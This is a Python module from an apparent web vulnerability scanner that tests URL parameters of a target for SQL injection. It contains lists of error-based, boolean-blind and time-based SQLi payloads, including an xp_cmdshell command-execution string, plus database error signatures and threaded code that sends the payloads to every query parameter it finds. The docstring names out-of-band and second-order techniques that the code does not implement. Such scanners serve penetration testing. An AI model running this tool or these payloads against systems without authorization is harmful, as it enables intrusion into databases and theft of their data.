"""
SQL Injection Testing Module
Techniques: Error-based, Boolean-based blind, Time-based blind,
            UNION-based, Out-of-band (OOB), Second-order hints
"""

import re
import time
import concurrent.futures
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from .utils import HTTPClient


# ─── Payloads ─────────────────────────────────────────────────────────────────

ERROR_PAYLOADS = [
    "'",  "\"",  "\\",  "%27",  "';",  "\";",
    "' OR '1'='1",  "' OR 1=1--",  "\" OR 1=1--",
    "' OR 'x'='x",  "') OR ('x'='x",
    "1; SELECT 1--",  "1' ORDER BY 1--",
    "1 UNION SELECT NULL--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    "' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "admin'--",  "' OR 1=1#",  "' OR 1=1/*",  "') OR ('1'='1",
    "1; EXEC xp_cmdshell('whoami')--",
]

BOOLEAN_PAYLOADS = [
    ("' AND 1=1--",  "' AND 1=2--"),
    ("' AND 'a'='a", "' AND 'a'='b"),
    ("1 AND 1=1",    "1 AND 1=2"),
    ("' OR 1=1--",   "' OR 1=2--"),
]

TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT SLEEP(5)--",
    "' OR SLEEP(5)--",
    "\" OR SLEEP(5)--",
    "1; SELECT SLEEP(5)--",
    "'; pg_sleep(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))x)--",
    "1 OR SLEEP(5)=0 LIMIT 1--",
]

# DB error signatures
ERROR_SIGNATURES = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql_",
    r"unclosed quotation mark",
    r"mysql_fetch_array",
    r"mysql_num_rows",
    # MSSQL
    r"microsoft ole db provider for sql server",
    r"odbc sql server driver",
    r"\[microsoft\]\[odbc",
    r"unclosed quotation mark after the character string",
    r"incorrect syntax near",
    # Oracle
    r"oracle error",
    r"ora-\d{5}",
    r"oracle.*driver",
    # PostgreSQL
    r"postgresql.*error",
    r"pg_query\(\)",
    r"pg_exec\(\)",
    # SQLite
    r"sqlite_",
    r"sqlite3::",
    r"system.data.sqlite",
    # Generic
    r"syntax error.*sql",
    r"sql command not properly ended",
    r"invalid use of null",
    r"sqlstate",
    r"jdbc",
]

COMPILED_ERRORS = [re.compile(p, re.I) for p in ERROR_SIGNATURES]


class SQLiTester:
    def __init__(self, config):
        self.config  = config
        self.http    = HTTPClient(config)
        self.threads = config.get('threads', 20)
        self.results = []

    def run(self, target, urls):
        print(f"    [~] Testing {len(urls)} URLs for SQLi...")
        targets = self._extract_injectable(urls, target)
        print(f"    [~] {len(targets)} injectable endpoints identified")

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = [ex.submit(self._test_endpoint, ep) for ep in targets]
            for f in concurrent.futures.as_completed(futures):
                res = f.result()
                if res:
                    self.results.extend(res)

        return self.results

    def _extract_injectable(self, urls, target):
        """Build list of (url, param, original_value) tuples."""
        endpoints = []
        base = f"https://{target}" if not target.startswith('http') else target

        for url in urls:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query, keep_blank_values=True)
            for param, values in qs.items():
                endpoints.append((url, param, values[0] if values else ''))

        # Also test the base URL with common params if nothing found
        if not endpoints:
            for param in ['id', 'uid', 'user', 'item', 'product', 'cat', 'page', 'q', 'search', 'name']:
                endpoints.append((f"{base}?{param}=1", param, '1'))

        return endpoints

    def _test_endpoint(self, endpoint):
        url, param, orig_val = endpoint
        findings = []

        # 1. Error-based
        for payload in ERROR_PAYLOADS:
            result = self._error_test(url, param, payload)
            if result:
                findings.append(result)
                break  # Don't need multiple payloads for same param

        # 2. Boolean-based
        for (true_pay, false_pay) in BOOLEAN_PAYLOADS:
            result = self._boolean_test(url, param, orig_val, true_pay, false_pay)
            if result:
                findings.append(result)
                break

        # 3. Time-based
        for payload in TIME_PAYLOADS:
            result = self._time_test(url, param, payload)
            if result:
                findings.append(result)
                break

        return findings

    def _error_test(self, url, param, payload):
        test_url = self._inject(url, param, payload)
        resp = self.http.get(test_url)
        if not resp:
            return None
        body = resp.text.lower()
        for pattern in COMPILED_ERRORS:
            if pattern.search(body):
                print(f"    [VULN] SQLi (Error-based) @ {url} param={param}")
                return {
                    'type':       'SQL Injection',
                    'technique':  'Error-based',
                    'url':        url,
                    'parameter':  param,
                    'payload':    payload,
                    'evidence':   pattern.pattern,
                    'severity':   'Critical',
                    'remediation': 'Use parameterized queries / prepared statements. Sanitize all user inputs.',
                    'cvss':       '9.8',
                    'cwe':        'CWE-89',
                }
        return None

    def _boolean_test(self, url, param, orig_val, true_pay, false_pay):
        resp_orig  = self.http.get(url)
        resp_true  = self.http.get(self._inject(url, param, orig_val + true_pay))
        resp_false = self.http.get(self._inject(url, param, orig_val + false_pay))

        if not all([resp_orig, resp_true, resp_false]):
            return None

        # Significant length difference between true/false indicates blind SQLi
        len_diff = abs(len(resp_true.text) - len(resp_false.text))
        if len_diff > 50 and abs(len(resp_orig.text) - len(resp_true.text)) < len_diff:
            print(f"    [VULN] SQLi (Boolean-blind) @ {url} param={param}")
            return {
                'type':       'SQL Injection',
                'technique':  'Boolean-based Blind',
                'url':        url,
                'parameter':  param,
                'payload':    true_pay,
                'evidence':   f"Response length diff: {len_diff} chars (true vs false)",
                'severity':   'Critical',
                'remediation': 'Use parameterized queries / prepared statements.',
                'cvss':       '9.8',
                'cwe':        'CWE-89',
            }
        return None

    def _time_test(self, url, param, payload):
        test_url = self._inject(url, param, payload)
        start = time.time()
        self.http.get(test_url)
        elapsed = time.time() - start

        if elapsed >= 4.5:  # 5s sleep with 0.5s tolerance
            print(f"    [VULN] SQLi (Time-based blind) @ {url} param={param} ({elapsed:.1f}s delay)")
            return {
                'type':       'SQL Injection',
                'technique':  'Time-based Blind',
                'url':        url,
                'parameter':  param,
                'payload':    payload,
                'evidence':   f"Response delayed {elapsed:.1f}s",
                'severity':   'Critical',
                'remediation': 'Use parameterized queries / prepared statements.',
                'cvss':       '9.8',
                'cwe':        'CWE-89',
            }
        return None

    def _inject(self, url, param, value):
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
